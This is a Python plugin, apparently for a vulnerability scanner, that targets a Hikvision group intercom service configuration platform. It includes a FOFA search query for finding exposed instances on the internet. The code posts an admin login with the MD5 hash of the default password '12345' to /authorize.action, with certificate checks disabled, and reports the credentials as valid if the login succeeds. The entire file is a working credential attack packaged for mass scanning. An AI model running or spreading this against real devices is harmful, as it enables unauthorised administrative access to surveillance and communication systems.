#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'HIKVISION群组对讲服务配置平台弱口令漏洞名',

      'level'     :   'high',

      'FOFA'      :   'app="HIKVISION-群组对讲服务配置平台"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/authorize.action'
  data = 'username=admin&userpsw=827ccb0eea8a706c4c34a16891f84e7b&language=zh_cn'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'success.*?true.*?msg.*?OK',res.text,re.S):
      ret['huixian'] = '账号/密码:admin/12345'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret